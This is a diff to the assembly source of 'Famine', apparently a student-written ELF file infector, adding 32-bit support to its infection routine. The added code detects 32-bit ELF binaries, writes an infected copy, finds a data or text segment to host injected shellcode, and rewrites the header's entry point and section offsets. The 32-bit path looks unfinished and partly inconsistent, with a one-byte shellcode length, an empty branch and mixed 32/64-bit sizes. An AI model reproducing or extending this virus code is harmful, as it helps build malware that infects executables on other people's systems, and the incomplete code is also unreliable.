@@ -245,7 +245,8 @@ famine_file:
 	cmp byte[rax + 3], 'F'
 	jne leave_famine_file
 	cmp byte[rax + 4], 2 ; ELFCLASS64 = 2, when handling 32bit changed the jmp
-	jne leave_famine_file
+	jne file32bit
+	;64BIT FILE
 	mov rdi, [rsp + 20] ; fname
 	call create_infected_file;will return a fd to it
 	cmp rax, -1
@@ -254,6 +255,19 @@ famine_file:
 	mov rsi, rax; wfd
 	mov rdx, [rsp + 12]; fsize
 	call parse64elf
+	jmp leave_famine_file
+	;32BIT FILE
+	file32bit:
+	cmp byte[rax + 4], 1; ELFCLASS32 = 1
+	jne leave_famine_file
+	mov rdi, [rsp + 20] ; fname
+	call create_infected_file;will return a fd to it
+	cmp rax, -1
+	je leave_famine_file; skip if we couldn't create add
+	mov rdi, [rsp + 4]; void *file
+	mov rsi, rax; wfd
+	mov rdx, [rsp + 12]; fsize
+	call parse32elf
 	; end parse MAGIC
 	
 	
@@ -442,6 +456,7 @@ push rdx
 	pop rdx
 	pop rcx
 retn
+
 %define SHELLCODE_LEN 100 ; 44 + 5 (jmp) + 12 (exit) + signature (39)
 %define SHELLCODE_JMP_INDEX 49 ; 44 + 5 (jmp)
 %define PURE_SHELLCODE_LEN 44 
@@ -1339,4 +1354,226 @@ write_signature:
 	syscall; write(wfd, "Famine version 1.0 (c)oded by sel-melc\0", 39)
 
 	add rsp, 40
+retn
+
+;	32 BIT PARSING
+%define SHELLCODE32_LEN 1
+
+; void parse64elf(void *file, int wfd, unsigned long fsize)
+parse32elf:
+	sub rsp, 8
+	call has_data_seg32
+	mov QWORD[rsp], rax
+	cmp rax, 0 ;We're gonna get pad to modify e_shoff
+	je pad_text32
+	call get_data_pad32
+	jmp pad_done32
+	pad_text32:
+	pad_done32:
+	mov r10d, eax; contains pad
+	call parse32elfheader
+	add rsp, 8
+retn
+; int has_data_seg(void *) check if there's a data segment (ret = 1) or only text (ret = 0)
+has_data_seg32:
+	push rdi
+	push rsi
+	push rdx
+	push rcx
+	push rbx
+	push r9
+
+	sub rsp, 2; e_phnum
+
+	xor rax, rax
+	mov bx,  WORD[rdi + 44]
+	mov WORD[rsp], bx; e_phnum stored
+	mov rbx, QWORD[rdi + 28]
+	add rdi, rbx; rdi now point to e_phoff
+	mov rbx, rdi; swap rdi and rsi for syscalls
+	mov rdi, rsi
+	mov rsi, rbx
+
+	xor rcx, rcx
+	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	loop_hds32: 
+		cmp cx, WORD[rsp]
+		jge loop_hds_exit32
+		lea r9, [rsi+rdx]; current phdr
+		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
+		jne continue_hds32
+		cmp DWORD[r9 + 24], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
+		jne continue_hds32
+		mov rax, 1
+		;data_seg found !
+		continue_hds32:
+		inc rcx
+		add rdx, 32; rdx += sizeof(Elf32_Phdr)
+		jmp loop_hds32
+	loop_hds_exit32: 
+	add rsp, 2
+	
+	pop r9
+	pop rbx
+	pop rcx
+	pop rdx
+	pop rsi
+	pop rdi
+retn
+
+
+parse32elfheader:
+	push rdi
+	push rsi
+	push rdx
+
+	sub rsp, 4; new entrypoint stocked here
+	cmp rax, 0
+	je fne_text32
+	fne_data32:
+	call find_new_entry32; will put it in rax
+	jmp fne_done32
+	fne_text32:
+	call find_new_entry_text32
+	fne_done32:
+	;Copy the begining of Elf header till entry
+	mov rbx, rdi
+	mov rdi, rsi
+	mov rsi, rbx
+	mov rdx, 24 ; sizeof(Elf64_Ehdr) till entrypoint
+	push rax
+	mov rax, 1
+	syscall; write(wfd, file, 24);
+	;Time to handle the entrypoint
+	pop rax
+	mov DWORD[rsp], eax;
+	add rsi, 28 ; points right after the entrypoint
+	mov rbx, rsi ; store rsi void *file+32
+	mov rsi, rsp
+	mov rdx, 4
+	mov rax, 1
+	syscall; write(wfd, "0x41424344", 8); this will write custom entrypoint
+	;write e_phoff
+	mov rdx, 4
+	mov rsi, rbx
+	mov rax, 1
+	syscall; write(wfd, file + 32, 8);
+	mov DWORD[rsp], r10d
+	add DWORD[rsp], SHELLCODE32_LEN
+	mov ebx, DWORD[rsi + 4]; e_shoff
+	add DWORD[rsp], ebx
+	mov rbx, rsi
+	mov rsi, rsp
+	mov rax, 1
+	syscall;write(wfd, &(e_shoff + SHELLCODE_LEN + pad), 8);
+	;Copy the remainder of the elf header
+	mov rsi, rbx
+	add rsi, 8
+	mov rdx, 16
+	mov rax, 1
+	syscall; write(wfd, file + 48, 16); copying everything after entrypoint
+
+
+	add rsp, 4
+
+	pop rdx
+	pop rsi
+	pop rdi
+retn
+
+; unsigned long find_new_entry32(void *file)
+; will return the offset to begining of our shellcode
+find_new_entry32:
+	push rdi
+	push rsi
+	push rdx
+	push rcx
+	push rbx
+	push r9
+
+	sub rsp, 2; e_phnum
+
+	xor rax, rax
+	mov bx,  WORD[rdi + 44]
+	mov WORD[rsp], bx; e_phnum stored
+	mov rbx, QWORD[rdi + 28]
+	add rdi, rbx; rdi now point to e_phoff
+	mov rbx, rdi; swap rdi and rsi for syscalls
+	mov rdi, rsi
+	mov rsi, rbx
+
+	xor rcx, rcx
+	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	loop_fne32: 
+		cmp cx, WORD[rsp]
+		jge loop_fne_exit32
+		lea r9, [rsi+rdx]; current phdr
+		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
+		jne continue_fne32
+		cmp DWORD[r9 + 24], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
+		jne continue_fne32
+		;we found the data segment ! bss ect... This is where the shellcode will be
+		mov eax, DWORD[r9 + 20];store p_memsz
+		add eax, DWORD[r9 + 8]; add p_vaddr so this gives us "the end" of the segment
+		continue_fne32:
+		inc rcx
+		add rdx, 32; rdx += sizeof(Elf64_Phdr)
+		jmp loop_fne32
+	loop_fne_exit32: 
+	add rsp, 2
+	
+	pop r9
+	pop rbx
+	pop rcx
+	pop rdx
+	pop rsi
+	pop rdi
+retn
+; unsigned long find_new_entry_text(void *file)
+; will return the offset to begining of our shellcode
+find_new_entry_text32:
+	push rdi
+	push rsi
+	push rdx
+	push rcx
+	push rbx
+	push r9
+
+	sub rsp, 2; e_phnum
+
+	xor rax, rax
+	mov bx,  WORD[rdi + 44]
+	mov WORD[rsp], bx; e_phnum stored
+	mov rbx, QWORD[rdi + 28]
+	add rdi, rbx; rdi now point to e_phoff
+	mov rbx, rdi; swap rdi and rsi for syscalls
+	mov rdi, rsi
+	mov rsi, rbx
+
+	xor rcx, rcx
+	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	loop_fnet32: 
+		cmp cx, WORD[rsp]
+		jge loop_fnet_exit32
+		lea r9, [rsi+rdx]; current phdr
+		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
+		jne continue_fnet32
+		cmp DWORD[r9 + 24], 5; phdr.p_flags == (PF_R | PF_E) means text seg, we're gonna infect it
+		jne continue_fnet32
+		;we found the text segment !This is where the shellcode will be
+		mov eax, QWORD[r9 + 20];store p_memsz
+		add rax, QWORD[r9 + 8]; add p_vaddr so this gives us "the end" of the segment
+		continue_fnet32:
+		inc rcx
+		add rdx, 32; rdx += sizeof(Elf64_Phdr)
+		jmp loop_fnet32
+	loop_fnet_exit32: 
+	add rsp, 2
+	
+	pop r9
+	pop rbx
+	pop rcx
+	pop rdx
+	pop rsi
+	pop rdi
 retn
